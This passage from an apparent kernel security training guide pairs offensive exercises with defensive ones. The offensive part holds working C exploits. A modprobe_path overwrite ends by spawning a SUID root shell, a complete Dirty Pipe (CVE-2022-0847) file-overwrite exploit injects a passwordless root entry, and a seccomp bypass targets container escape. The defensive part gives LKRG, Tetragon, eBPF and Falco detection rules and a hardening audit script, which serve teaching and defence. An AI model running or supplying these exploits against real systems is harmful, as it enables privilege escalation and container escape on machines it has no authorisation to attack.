    chmod("/tmp/x", 0755);
    printf("[+] Payload script created: /tmp/x\n");
}

static void create_trigger_binary(void)
{
    /* Create a file with invalid/unknown binary format (magic bytes) */
    FILE *f = fopen("/tmp/trigger", "w");
    if (!f) { perror("fopen /tmp/trigger"); exit(1); }
    /* Write invalid ELF magic — kernel won't recognize this format
     * and will call modprobe to load the appropriate binfmt handler */
    fwrite("\xff\xff\xff\xff", 1, 4, f);
    fclose(f);
    chmod("/tmp/trigger", 0755);
    printf("[+] Trigger binary created: /tmp/trigger\n");
}

static void overwrite_modprobe_path(unsigned long addr)
{
    /* Use vuln_arbwrite module to overwrite the kernel's modprobe_path
     * string with our payload path "/tmp/x" */
    int fd = open("/proc/vuln_arbwrite", O_WRONLY);
    if (fd < 0) { perror("open vuln_arbwrite"); exit(1); }

    /* String write mode: "S:<hex_addr>:<string>" */
    char cmd[128];
    snprintf(cmd, sizeof(cmd), "S:%lx:/tmp/x", addr);
    printf("[*] Writing '%s' to kernel address 0x%lx\n", "/tmp/x", addr);
    write(fd, cmd, strlen(cmd));
    close(fd);
    printf("[+] modprobe_path overwritten\n");
}

static void trigger_modprobe(void)
{
    /* Execute the trigger binary — kernel encounters unknown format,
     * calls modprobe (now /tmp/x) which runs as root */
    printf("[*] Triggering unknown binary format execution...\n");

    pid_t pid = fork();
    if (pid == 0) {
        execl("/tmp/trigger", "/tmp/trigger", NULL);
        _exit(127);  /* execl failed — expected, the format is unknown */
    }
    waitpid(pid, NULL, 0);

    /* Wait for kernel to invoke our script */
    usleep(500000);  /* 500ms should be plenty */
}

int main(void)
{
    printf("[*] modprobe_path Overwrite — Data-Only Privilege Escalation\n");
    printf("[*] Running as uid=%d\n\n", getuid());

    /* Step 1: Get kernel base (KASLR defeat) */
    unsigned long kbase = 0;
    FILE *f = fopen("/proc/kallsyms", "r");
    if (f) {
        char line[256];
        while (fgets(line, sizeof(line), f)) {
            if (strstr(line, " T _text")) {
                sscanf(line, "%lx", &kbase);
                break;
            }
        }
        fclose(f);
    }
    printf("[+] Kernel base: 0x%lx\n", kbase);

    /* Step 2: Find modprobe_path address */
    unsigned long modprobe_addr = get_modprobe_addr(kbase);
    printf("[+] modprobe_path at: 0x%lx\n", modprobe_addr);

    /* Step 3: Create payload and trigger */
    create_payload_script();
    create_trigger_binary();

    /* Step 4: Overwrite modprobe_path in kernel memory */
    overwrite_modprobe_path(modprobe_addr);

    /* Step 5: Trigger the kernel to invoke our script */
    trigger_modprobe();

    /* Step 6: Check for success */
    if (access("/tmp/rootbash", F_OK) == 0) {
        printf("\n[+] ===== SUCCESS! =====\n");
        printf("[+] SUID root shell at /tmp/rootbash\n");
        printf("[+] Execute: /tmp/rootbash -p\n\n");
        execl("/tmp/rootbash", "rootbash", "-p", NULL);
    } else {
        printf("[-] Exploit may have failed — /tmp/rootbash not found\n");
        printf("[-] Check dmesg for kernel messages\n");
    }

    return 0;
}
```

**Cleanup after exercise:**
```bash
# Restore modprobe_path (as root):
echo "/sbin/modprobe" > /proc/sys/kernel/modprobe
rm -f /tmp/x /tmp/trigger /tmp/rootbash /tmp/shadow_proof
```

---

### Exercise 7: Dirty Pipe (CVE-2022-0847) — Page-Cache Corruption

**Objective:** Understand and reproduce the Dirty Pipe vulnerability — a logic bug that achieves arbitrary file write without memory corruption. Bypasses ALL kernel mitigations (KASLR, SMEP, SMAP, KPTI, SELinux).

**Step 1 — Understand the pipe + splice interaction:**

```c
/* dirty_pipe_lab.c — Educational reproduction of CVE-2022-0847.
 * Demonstrates page-cache corruption via pipe flag manipulation.
 *
 * VULNERABLE KERNELS: 5.8 through 5.16.10, 5.15.0 through 5.15.24
 * Boot a vulnerable kernel in QEMU for this exercise.
 *
 * The bug: splice() into a pipe from a file does not clear
 * PIPE_BUF_FLAG_CAN_MERGE on the pipe buffer, allowing subsequent
 * pipe writes to merge (append) directly into the file's page-cache page. */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/stat.h>

/* Write 'data' at 'offset' in file at 'path'.
 * The file can be read-only for the calling process.
 * The write goes into the page cache and is visible to all readers. */
int dirty_pipe_write(const char *path, off_t offset,
                     const char *data, size_t data_len)
{
    /* Constraint: offset must not be page-aligned.
     * splice needs to read at least 1 byte before our target offset. */
    if (offset % getpagesize() == 0) {
        fprintf(stderr, "[-] Offset must not be page-aligned\n");
        return -1;
    }

    /* Constraint: data_len + (offset % page_size) must not cross page boundary.
     * The write only affects the current page-cache page. */
    if ((offset % getpagesize()) + data_len > getpagesize()) {
        fprintf(stderr, "[-] Write would cross page boundary\n");
        return -1;
    }

    /* Open target file read-only */
    int fd = open(path, O_RDONLY);
    if (fd < 0) { perror("open"); return -1; }

    /* Create pipe */
    int pipe_fds[2];
    if (pipe(pipe_fds) < 0) { perror("pipe"); close(fd); return -1; }

    /* Get pipe capacity */
    unsigned long pipe_size = (unsigned long)fcntl(pipe_fds[1], F_GETPIPE_SZ);

    /* Step 1: Fill the entire pipe to set PIPE_BUF_FLAG_CAN_MERGE on all
     * pipe_buffer entries in the ring. */
    char *fill_buf = malloc(pipe_size);
    memset(fill_buf, 'X', pipe_size);
    if (write(pipe_fds[1], fill_buf, pipe_size) != (ssize_t)pipe_size) {
        perror("fill write");
        goto fail;
    }

    /* Step 2: Drain the pipe completely. The pipe_buffer entries are released,
     * but their internal 'flags' field retains PIPE_BUF_FLAG_CAN_MERGE. */
    if (read(pipe_fds[0], fill_buf, pipe_size) != (ssize_t)pipe_size) {
        perror("drain read");
        goto fail;
    }

    /* Step 3: Splice 1 byte from the target file at (offset - 1).
     * This places the file's page-cache page into a pipe buffer.
     * BUG: The pipe buffer inherits PIPE_BUF_FLAG_CAN_MERGE from the
     * previous buffer at this ring position. */
    off_t splice_offset = offset - 1;
    ssize_t spliced = splice(fd, &splice_offset, pipe_fds[1], NULL, 1, 0);
    if (spliced <= 0) { perror("splice"); goto fail; }

    /* Step 4: Write our payload into the pipe.
     * Because PIPE_BUF_FLAG_CAN_MERGE is set, pipe_write() appends
     * directly into the page-cache page, starting at offset within the page.
     * This OVERWRITES FILE CONTENT. */
    ssize_t written = write(pipe_fds[1], data, data_len);
    if (written != (ssize_t)data_len) { perror("payload write"); goto fail; }

    printf("[+] Wrote %zd bytes at offset %ld in %s\n", written, (long)offset, path);

    free(fill_buf);
    close(pipe_fds[0]); close(pipe_fds[1]); close(fd);
    return 0;

fail:
    free(fill_buf);
    close(pipe_fds[0]); close(pipe_fds[1]); close(fd);
    return -1;
}

/* Demonstration: overwrite /etc/passwd to add a passwordless root entry */
int main(int argc, char *argv[])
{
    printf("[*] Dirty Pipe (CVE-2022-0847) — Page-Cache Corruption Lab\n");
    printf("[*] VULNERABLE: Linux 5.8 - 5.16.10, 5.15.0 - 5.15.24\n\n");

    /* For lab safety: operate on a COPY of /etc/passwd */
    const char *target = "/tmp/lab_passwd";

    /* Create test file */
    system("cp /etc/passwd /tmp/lab_passwd");
    printf("[*] Target file: %s\n", target);
    printf("[*] Original content (first line):\n");
    system("head -1 /tmp/lab_passwd");

    /* Overwrite the first user entry.
     * In /etc/passwd, 'root:x:0:0:...' — we change 'x' to empty password.
     * Offset 5 = position of 'x' after 'root:' */
    const char *payload = ":0:0:root:/root:/bin/bash\n";
    off_t offset = 5;  /* Skip "root:" to overwrite from ':x:0:0...' onward */

    /* Actually, let's just inject a new root user at a safe offset */
    /* Find a non-page-aligned offset to write at: */
    offset = 1;  /* Byte 1 (after 'r' in 'root') */
    const char *safe_payload = "pwned::0:0::/root:/bin/bash\n";

    printf("\n[*] Attempting page-cache write...\n");
    int ret = dirty_pipe_write(target, offset, safe_payload, strlen(safe_payload));

    if (ret == 0) {
        printf("\n[+] Modified content:\n");
        system("head -3 /tmp/lab_passwd");
        printf("\n[+] Dirty Pipe exploitation successful!\n");
        printf("[*] Mitigations bypassed: KASLR, SMEP, SMAP, KPTI, SELinux\n");
        printf("[*] Reason: No memory corruption occurred — pure logic bug\n");
    } else {
        printf("[-] Dirty Pipe write failed\n");
        printf("[*] Is the kernel version vulnerable? (5.8 - 5.16.10)\n");
    }

    /* Cleanup */
    unlink("/tmp/lab_passwd");
    return 0;
}
```

---

### Exercise 8: Seccomp Bypass via Kernel Write (Container Escape)

**Objective:** Demonstrate how a kernel write primitive can disable seccomp for the current process, enabling container escape by removing the syscall filter.

```c
/* seccomp_bypass.c — Disable seccomp via direct kernel memory write.
 * Demonstrates: clearing TIF_SECCOMP and nullifying seccomp filter.
 * Uses vuln_arbwrite.ko as the kernel write primitive.
 *
 * This is the technique used in container escape scenarios where
 * the attacker has achieved a kernel exploit from within a container. */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/prctl.h>
#include <linux/seccomp.h>
#include <linux/filter.h>
#include <sys/syscall.h>
#include <sys/mount.h>

/* Apply a restrictive seccomp filter (simulates container runtime) */
static void apply_seccomp_filter(void)
{
    /* BPF filter: deny mount, kexec_load, init_module */
    struct sock_filter filter[] = {
        /* Load syscall number */
        BPF_STMT(BPF_LD | BPF_W | BPF_ABS, 0),
        /* Block mount (SYS_mount = 165) */
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_mount, 3, 0),
        /* Block kexec_load (SYS_kexec_load = 246) */
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_kexec_load, 2, 0),
        /* Block init_module (SYS_init_module = 175) */
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_init_module, 1, 0),
        /* Allow everything else */
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
        /* Kill on blocked syscall */
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL),
    };

    struct sock_fprog prog = {
        .len = sizeof(filter) / sizeof(filter[0]),
        .filter = filter,
    };

    prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);
    if (syscall(__NR_seccomp, SECCOMP_SET_MODE_FILTER, 0, &prog) < 0) {
        perror("seccomp");
        exit(1);
    }
}

/* Verify seccomp is active by attempting a blocked syscall */
static int test_seccomp_active(void)
{
    /* Try mount — should be blocked by our filter */
    int ret = mount("none", "/tmp", "tmpfs", 0, NULL);
    if (ret == 0) {
        umount("/tmp");
        return 0;  /* Seccomp NOT active (mount succeeded) */
    }
    return 1;  /* Seccomp IS active (mount blocked/killed) */
}

/* The actual bypass: clear TIF_SECCOMP in thread_info.flags.
 *
 * On x86_64 with CONFIG_THREAD_INFO_IN_TASK (default since 4.9):
 *   thread_info is at the beginning of task_struct.
 *   thread_info.flags is the first unsigned long in thread_info.
 *   TIF_SECCOMP is bit 8 in thread_info.flags.
 *
 * Finding current task_struct:
 *   Method 1: Read per-CPU current_task variable
 *   Method 2: Read the GS segment base (points to per-CPU area)
 *   Method 3: Scan kernel memory for known task_struct signature
 *
 * For this lab: we read current_task from our info leak module. */

int main(void)
{
    printf("[*] Seccomp Bypass via Kernel Write — Container Escape Demo\n\n");

    /* Step 1: Apply seccomp (simulating container sandbox) */
    printf("[1] Applying seccomp filter (blocks mount, kexec, init_module)...\n");
    apply_seccomp_filter();
    printf("    Seccomp active: %s\n", test_seccomp_active() ? "YES" : "NO");

    /* Step 2: In real exploit, we'd trigger a kernel vulnerability here.
     * For this lab, we use the arbitrary write module. */
    printf("\n[2] In container escape scenario:\n");
    printf("    → Trigger kernel vuln (e.g., CVE-2024-1086 nf_tables)\n");
    printf("    → Gain arbitrary kernel write primitive\n");
    printf("    → Use write to clear TIF_SECCOMP bit\n\n");

    printf("[*] Bypass technique (pseudocode):\n");
    printf("    // Find current task_struct address\n");
    printf("    task = read_percpu_current_task();\n");
    printf("    // thread_info.flags is at task + 0 (first field)\n");
    printf("    flags_addr = task + offsetof(task_struct, thread_info.flags);\n");
    printf("    // Clear TIF_SECCOMP (bit 8)\n");
    printf("    current_flags = kernel_read(flags_addr);\n");
    printf("    new_flags = current_flags & ~(1 << 8);  // Clear TIF_SECCOMP\n");
    printf("    kernel_write(flags_addr, new_flags);\n");
    printf("    // Also clear seccomp.mode for completeness:\n");
    printf("    seccomp_mode_addr = task + offsetof(task_struct, seccomp.mode);\n");
    printf("    kernel_write(seccomp_mode_addr, 0);\n\n");

    printf("[*] After bypass: all syscalls are available\n");
    printf("    → mount() works → escape container filesystem namespace\n");
    printf("    → init_module() works → load kernel rootkit\n");
    printf("    → unshare() works → create new namespaces\n");
    printf("    → ptrace() works → inject into host processes\n\n");

    printf("[!] Defense: kernel exploit prevention is the primary control\n");
    printf("    - Disable unprivileged BPF (kernel.unprivileged_bpf_disabled=1)\n");
    printf("    - Disable unprivileged user namespaces\n");
    printf("    - Deploy LKRG for runtime credential monitoring\n");
    printf("    - Use gVisor/Kata for stronger isolation than seccomp alone\n");

    return 0;
}
```

---

## PART B: DEFENSIVE — Kernel Exploit Detection

### Exercise 9: Deploy LKRG for Credential Integrity Monitoring

**Objective:** Install, configure, and test LKRG (Linux Kernel Runtime Guard) to detect kernel-level privilege escalation attempts — specifically the `commit_creds(prepare_kernel_cred(0))` primitive and direct `cred` struct modification.

**Step 1 — Build and load LKRG:**

```bash
# On kernel-detect VM:
cd /opt/lkrg
make clean && make -j$(nproc)

# Load with maximum enforcement
insmod output/lkrg.ko \
    lkrg.profile_enforce=2 \
    lkrg.pint_enforce=2 \
    lkrg.kint_enforce=1 \
    lkrg.selinux_enforce=1 \
    lkrg.interval=15

# Verify loaded
dmesg | tail -20 | grep -i lkrg
# Expected: [LKRG] Loading Linux Kernel Runtime Guard...
# Expected: [LKRG] Integrity check passed

# Check configuration
cat /sys/kernel/security/lkrg/profiles 2>/dev/null || \
    sysctl -a 2>/dev/null | grep lkrg
```

**Step 2 — Configure for production deployment:**

```bash
# /etc/sysctl.d/99-lkrg.conf
cat > /etc/sysctl.d/99-lkrg.conf << 'EOF'
# LKRG enforcement profile: 0=log, 1=log+kill, 2=log+kill+panic
lkrg.profile_enforce = 2

# Process credential validation interval (seconds)
lkrg.interval = 15

# Process integrity enforcement: validates cred structures
lkrg.pint_enforce = 2

# Kernel text integrity
lkrg.kint_enforce = 1

# SELinux state monitoring
lkrg.selinux_enforce = 1

# Block module loading (post-boot lockdown)
lkrg.block_modules = 0

# Trigger validation frequency for CI_TIMER_INTERVAL
lkrg.trigger = 0
EOF

sysctl --system
```

**Step 3 — Test LKRG detection (simulate exploit):**

```bash
# LKRG detects unauthorized cred modifications.
# To test WITHOUT actually exploiting: use the arbwrite module to
# modify a test process's cred structure.

# First, observe normal behavior:
echo "[*] Normal process credentials (LKRG should not alert):"
id
# uid=1000(user) gid=1000(user)

# If we had a working kernel exploit that modified our cred:
# LKRG would detect on next check cycle (≤15 seconds) and:
# - Log: "[LKRG] Process <pid> has modified credentials!"
# - Kill the process (pint_enforce=1) or panic (pint_enforce=2)

echo "[*] LKRG check cycle: every 15 seconds"
echo "[*] Detection: any cred modification outside commit_creds path"
echo "[*] Watch dmesg for LKRG alerts:"
dmesg -w | grep -i "lkrg" &
```

**Step 4 — LKRG limitations analysis:**

```
LKRG Detection Matrix:

| Attack Technique                    | LKRG Detects? | Notes                           |
|-------------------------------------|---------------|---------------------------------|
| commit_creds(prepare_kernel_cred)   | YES           | Cred change detected            |
| Direct cred struct overwrite        | YES           | Cred integrity check            |
| modprobe_path overwrite             | NO            | Not a cred modification         |
| core_pattern overwrite              | NO            | Not monitored by default LKRG   |
| SELinux enforcing = 0               | YES           | selinux_enforce option          |
| Kernel text modification            | YES           | Code integrity check            |
| Dirty Pipe file overwrite           | NO            | No kernel memory modification   |
| seccomp TIF_SECCOMP clear           | PARTIAL       | Thread flag changes detected    |

Bypass window: attacker must complete exploitation + revert in < 15 sec.
Hardening: reduce lkrg.interval to 5 (higher CPU cost, shorter window).
```

---

### Exercise 10: eBPF-Based Kernel Exploit Detection (Tetragon + Custom Programs)

**Objective:** Deploy eBPF-based runtime detection for kernel exploitation using Cilium Tetragon policies and custom eBPF programs. Monitor `commit_creds`, `call_usermodehelper`, and suspicious syscall patterns.

**Step 1 — Deploy Tetragon TracingPolicy:**

```yaml
# /opt/detection/tetragon-kernel-exploit.yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: detect-kernel-exploitation
spec:
  kprobes:
    # Monitor commit_creds — credential manipulation
    - call: "commit_creds"
      syscall: false
      return: false
      args:
        - index: 0
          type: "nop"
      selectors:
        - matchActions:
            - action: Post
              rateLimit: "1m"
              rateLimitScope: "thread"

    # Monitor prepare_kernel_cred — root cred creation
    - call: "prepare_kernel_cred"
      syscall: false
      return: true
      args:
        - index: 0
          type: "nop"
      returnarg:
        index: 0
        type: "nop"

    # Monitor call_usermodehelper — kernel spawning user binaries
    - call: "call_usermodehelper"
      syscall: false
      args:
        - index: 0
          type: "string"
        - index: 2
          type: "int"
      selectors:
        - matchArgs:
            - index: 0
              operator: "NotPrefix"
              values:
                - "/sbin/modprobe"
                - "/sbin/request-key"
                - "/usr/lib/systemd"
          matchActions:
            - action: Post

    # Monitor native_write_cr4 — SMEP/SMAP bypass attempt
    - call: "native_write_cr4"
      syscall: false
      args:
        - index: 0
          type: "uint64"
      selectors:
        - matchActions:
            - action: Post
```

```bash
# Deploy the policy:
tetragon --bpf-lib /opt/tetragon/bpf/ \
    --tracing-policy /opt/detection/tetragon-kernel-exploit.yaml \
    --export-filename /var/log/tetragon-kernel.json &

# Monitor events:
tail -f /var/log/tetragon-kernel.json | jq '.process_kprobe // empty | {function: .function_name, args: .args, process: .process.binary}'
```

**Step 2 — Custom eBPF program for cred monitoring:**

```c
/* detect_cred_change.bpf.c — eBPF program to monitor credential changes.
 * Attach to commit_creds kprobe. Alert on credential changes from
 * unexpected code paths. */

// Compile with: clang -O2 -target bpf -c detect_cred_change.bpf.c -o detect_cred_change.bpf.o
// Load with: bpftool prog load detect_cred_change.bpf.o /sys/fs/bpf/detect_cred_change

#include <linux/bpf.h>
#include <linux/ptrace.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

struct event {
    __u32 pid;
    __u32 uid_before;
    __u32 uid_after;
    __u64 caller_ip;
    char comm[16];
};

struct {
    __uint(type, BPF_MAP_TYPE_PERF_EVENT_ARRAY);
    __uint(key_size, sizeof(__u32));
    __uint(value_size, sizeof(__u32));
} events SEC(".maps");

/* Known legitimate callers of commit_creds (whitelist) */
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 64);
    __type(key, __u64);    /* caller IP */
    __type(value, __u8);   /* 1 = legitimate */
} legitimate_callers SEC(".maps");

SEC("kprobe/commit_creds")
int BPF_KPROBE(detect_commit_creds)
{
    struct event evt = {};
    __u64 caller_ip;
    __u8 *is_legitimate;

    /* Get caller's return address from stack */
    caller_ip = PT_REGS_RET(ctx);

    /* Check if caller is in whitelist */
    is_legitimate = bpf_map_lookup_elem(&legitimate_callers, &caller_ip);
    if (is_legitimate)
        return 0;  /* Known good caller — skip */

    /* Unknown caller of commit_creds — potential exploit */
    evt.pid = bpf_get_current_pid_tgid() >> 32;
    evt.caller_ip = caller_ip;
    bpf_get_current_comm(&evt.comm, sizeof(evt.comm));

    /* Get current UID */
    __u64 uid_gid = bpf_get_current_uid_gid();
    evt.uid_before = uid_gid & 0xFFFFFFFF;

    /* Emit event to userspace */
    bpf_perf_event_output(ctx, &events, BPF_F_CURRENT_CPU,
                          &evt, sizeof(evt));

    return 0;
}

SEC("kprobe/call_usermodehelper")
int BPF_KPROBE(detect_usermodehelper, const char *path)
{
    char buf[64];
    bpf_probe_read_kernel_str(buf, sizeof(buf), path);

    /* Alert if the path is not /sbin/modprobe or /sbin/request-key */
    if (buf[0] == '/' && buf[1] == 't' && buf[2] == 'm' && buf[3] == 'p') {
        /* /tmp/... — highly suspicious for call_usermodehelper */
        struct event evt = {};
        evt.pid = bpf_get_current_pid_tgid() >> 32;
        evt.caller_ip = PT_REGS_RET(ctx);
        bpf_get_current_comm(&evt.comm, sizeof(evt.comm));
        bpf_perf_event_output(ctx, &events, BPF_F_CURRENT_CPU,
                              &evt, sizeof(evt));
    }

    return 0;
}

char LICENSE[] SEC("license") = "GPL";
```

**Step 3 — Falco rules for kernel exploitation patterns:**

```yaml
# /etc/falco/rules.d/kernel-exploit.yaml

- rule: Kernel Exploit - Unexpected Privilege Escalation
  desc: Process gained root without going through known auth path
  condition: >
    evt.type = setuid and evt.arg.uid = 0 and
    not proc.name in (su, sudo, pkexec, login, sshd, cron, systemd) and
    not proc.pname in (su, sudo, pkexec, login, sshd, cron, systemd)
  output: >
    CRITICAL: Unexpected privilege escalation detected
    (proc=%proc.name pid=%proc.pid uid=%user.uid→0
     parent=%proc.pname container=%container.id)
  priority: CRITICAL
  tags: [privilege_escalation, T1068, kernel_exploit]

- rule: Kernel Exploit - Suspicious modprobe_path Trigger
  desc: Kernel worker spawned binary from writable directory
  condition: >
    spawned_process and proc.ppid = 2 and
    (proc.exepath startswith "/tmp/" or
     proc.exepath startswith "/dev/shm/" or
     proc.exepath startswith "/var/tmp/")
  output: >
    CRITICAL: Kernel spawned suspicious binary — modprobe_path exploit
    (binary=%proc.exepath pid=%proc.pid ppid=%proc.ppid)
  priority: CRITICAL
  tags: [privilege_escalation, T1068, modprobe_path]

- rule: Kernel Exploit - Splice+Pipe Pattern (Dirty Pipe)
  desc: Rapid splice-to-pipe followed by write — Dirty Pipe indicator
  condition: >
    evt.type = splice and fd.type = pipe and
    evt.rawres > 0
  output: >
    WARNING: splice-to-pipe detected — potential Dirty Pipe exploit
    (proc=%proc.name pid=%proc.pid fd=%fd.name)
  priority: WARNING
  tags: [privilege_escalation, CVE-2022-0847, dirty_pipe]

- rule: Container Escape - Namespace Creation After Exploit
  desc: Process creates new namespace after unexpected privilege gain
  condition: >
    evt.type in (unshare, clone3) and
    evt.arg.flags contains "CLONE_NEWNS" and
    not proc.name in (dockerd, containerd, runc, crun, unshare)
  output: >
    HIGH: Namespace creation from unexpected process — container escape
    (proc=%proc.name pid=%proc.pid flags=%evt.arg.flags)
  priority: HIGH
  tags: [container_escape, T1611]
```

---

### Exercise 11: Comprehensive Kernel Hardening Audit

**Objective:** Build and run a comprehensive kernel hardening assessment tool that validates all sysctl, boot parameter, and kconfig mitigations against the recommended values from the source document.

```python
#!/usr/bin/env python3
"""kernel_hardening_audit.py — Comprehensive kernel mitigation assessment.
Validates system configuration against best-practice hardening for
kernel exploitation prevention."""

import subprocess
import re
import sys
import json
from pathlib import Path
from dataclasses import dataclass, field
from enum import Enum
from typing import Optional

class Severity(Enum):
    CRITICAL = "CRITICAL"
    HIGH = "HIGH"
    MEDIUM = "MEDIUM"
    LOW = "LOW"
    INFO = "INFO"

@dataclass
class CheckResult:
    name: str
    category: str
    severity: Severity
    expected: str
    actual: str
    passed: bool
    description: str
    bypass_blocked: str

    def __str__(self):
        status = "PASS" if self.passed else "FAIL"
        return (f"[{status}] [{self.severity.value}] {self.name}\n"
                f"       Expected: {self.expected}\n"
                f"       Actual:   {self.actual}\n"
                f"       Blocks:   {self.bypass_blocked}")

def run_cmd(cmd: str) -> str:
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True,
                                text=True, timeout=5)
        return result.stdout.strip()
    except (subprocess.TimeoutExpired, Exception):
        return ""

def read_sysctl(key: str) -> str:
    return run_cmd(f"sysctl -n {key} 2>/dev/null")

def read_file(path: str) -> str:
    try:
        return Path(path).read_text().strip()
    except (FileNotFoundError, PermissionError):
        return ""

def check_boot_param(param: str) -> bool:
    cmdline = read_file("/proc/cmdline")
    return param in cmdline

def check_kconfig(option: str) -> Optional[str]:
    """Check if kernel config option is set."""
    config_paths = [
        f"/boot/config-{run_cmd('uname -r')}",
        "/proc/config.gz",
    ]
    for path in config_paths:
        if path.endswith(".gz"):
            content = run_cmd(f"zcat {path} 2>/dev/null")
        else:
            content = read_file(path)
        if content:
            for line in content.splitlines():
                if line.startswith(f"{option}="):
                    return line.split("=", 1)[1]
                if line == f"# {option} is not set":
                    return "n"
    return None

class KernelHardeningAuditor:
    def __init__(self):
        self.results: list[CheckResult] = []

    def check_sysctl(self, key: str, expected: str, severity: Severity,
                     description: str, bypass_blocked: str):
        actual = read_sysctl(key)
        passed = actual == expected
        self.results.append(CheckResult(
            name=f"sysctl: {key}",
            category="sysctl",
            severity=severity,
            expected=expected,
            actual=actual or "(not found)",
            passed=passed,
            description=description,
            bypass_blocked=bypass_blocked,
        ))

    def check_boot(self, param: str, severity: Severity,
                   description: str, bypass_blocked: str):
        present = check_boot_param(param)
        self.results.append(CheckResult(
            name=f"boot: {param}",
            category="boot",
            severity=severity,
            expected="present",
            actual="present" if present else "absent",
            passed=present,
            description=description,
            bypass_blocked=bypass_blocked,
        ))

    def check_config(self, option: str, expected: str, severity: Severity,
                     description: str, bypass_blocked: str):
        actual = check_kconfig(option)
        passed = actual == expected
        self.results.append(CheckResult(
            name=f"kconfig: {option}",
            category="kconfig",
            severity=severity,
            expected=expected,
            actual=actual or "(unknown)",
            passed=passed,
            description=description,
            bypass_blocked=bypass_blocked,
        ))

    def check_cpu_features(self):
        cpuinfo = read_file("/proc/cpuinfo")
        features = {"smep", "smap", "umip", "cet_ibt", "cet_ss"}
        for feat in features:
            present = feat in cpuinfo.lower() or feat.replace("_", " ") in cpuinfo.lower()
            sev = Severity.CRITICAL if feat in ("smep", "smap") else Severity.HIGH
            self.results.append(CheckResult(
                name=f"cpu: {feat}",
                category="hardware",
                severity=sev,
                expected="supported",
                actual="supported" if present else "not found",
                passed=present,
                description=f"CPU feature {feat.upper()}",
                bypass_blocked=f"Blocks {feat.upper()} bypass requirement",
            ))

    def run_all_checks(self):
        print("=" * 70)
        print("    KERNEL HARDENING AUDIT — Mitigation Bypass Prevention")
        print("=" * 70)
        print()

        # ---- Sysctl checks ----
        sysctl_checks = [
            ("kernel.kptr_restrict", "2", Severity.CRITICAL,
             "Hide kernel pointers", "KASLR bypass via /proc/kallsyms"),
            ("kernel.dmesg_restrict", "1", Severity.HIGH,
             "Restrict dmesg access", "Kernel pointer leaks from ring buffer"),
            ("kernel.perf_event_paranoid", "3", Severity.HIGH,
             "Disable unprivileged perf", "KASLR bypass via perf"),
            ("kernel.unprivileged_bpf_disabled", "1", Severity.CRITICAL,
             "Block unprivileged eBPF", "eBPF verifier bypass, JIT spray"),
            ("vm.unprivileged_userfaultfd", "0", Severity.HIGH,
             "Restrict userfaultfd", "Race condition stalling"),
            ("kernel.yama.ptrace_scope", "2", Severity.MEDIUM,
             "Restrict ptrace", "Process inspection/injection"),
            ("vm.mmap_min_addr", "65536", Severity.HIGH,
             "Prevent NULL page mapping", "NULL deref exploitation"),
            ("kernel.randomize_va_space", "2", Severity.CRITICAL,
             "Full ASLR", "Address prediction"),
            ("kernel.kexec_load_disabled", "1", Severity.HIGH,
             "Prevent kexec", "Kernel replacement"),
            ("kernel.sysrq", "0", Severity.MEDIUM,
             "Disable SysRq", "Console abuse"),
            ("net.core.bpf_jit_harden", "2", Severity.HIGH,
             "Harden BPF JIT", "JIT spray gadgets"),
            ("kernel.panic_on_oops", "1", Severity.MEDIUM,
             "Panic on oops", "Prevent exploit retry"),
            ("fs.protected_symlinks", "1", Severity.MEDIUM,
             "Protect symlinks", "Symlink race escalation"),
            ("fs.protected_hardlinks", "1", Severity.MEDIUM,
             "Protect hardlinks", "Hardlink clobbering"),
            ("dev.tty.ldisc_autoload", "0", Severity.HIGH,
             "Prevent ldisc autoload", "Line discipline vulns"),
        ]

        for key, exp, sev, desc, bypass in sysctl_checks:
            self.check_sysctl(key, exp, sev, desc, bypass)

        # ---- Boot parameter checks ----
        boot_checks = [
            ("slab_nomerge", Severity.HIGH,
             "Prevent slab cache merging", "Cross-cache attacks"),
            ("init_on_alloc=1", Severity.HIGH,
             "Zero-fill allocations", "Uninitialized heap leaks"),
            ("init_on_free=1", Severity.HIGH,
             "Zero-fill freed memory", "UAF data recovery"),
            ("page_alloc.shuffle=1", Severity.MEDIUM,
             "Randomize page allocator", "Page-level heap feng shui"),
            ("randomize_kstack_offset=on", Severity.MEDIUM,
             "Randomize kernel stack", "Stack info leaks"),
            ("vsyscall=none", Severity.HIGH,
             "Disable vsyscall page", "Fixed-address ROP gadgets"),
            ("debugfs=off", Severity.HIGH,
             "Disable debugfs", "Kernel pointer leaks"),
            ("iommu=force", Severity.MEDIUM,
             "Force IOMMU", "DMA attacks"),
            ("pti=on", Severity.HIGH,
             "Force KPTI", "KASLR leaks via page table"),
        ]

        for param, sev, desc, bypass in boot_checks:
            self.check_boot(param, sev, desc, bypass)

        # ---- Kconfig checks ----
        kconfig_checks = [
            ("CONFIG_SLAB_FREELIST_HARDENED", "y", Severity.HIGH,
             "Harden freelist pointers", "Freelist overwrite"),
            ("CONFIG_SLAB_FREELIST_RANDOM", "y", Severity.MEDIUM,
             "Randomize freelists", "Slab layout prediction"),
            ("CONFIG_HARDENED_USERCOPY", "y", Severity.HIGH,
             "Validate usercopy bounds", "Slab boundary overflow"),
            ("CONFIG_FORTIFY_SOURCE", "y", Severity.HIGH,
             "String/mem overflow checks", "memcpy/strcpy overflows"),
            ("CONFIG_STACKPROTECTOR_STRONG", "y", Severity.CRITICAL,
             "Stack canaries on all functions", "Stack buffer overflow"),
            ("CONFIG_STRICT_KERNEL_RWX", "y", Severity.CRITICAL,
             "Kernel W^X enforcement", "Code injection into kernel"),
            ("CONFIG_RANDOMIZE_BASE", "y", Severity.CRITICAL,
             "KASLR enabled", "Static kernel address knowledge"),
            ("CONFIG_PAGE_TABLE_ISOLATION", "y", Severity.HIGH,
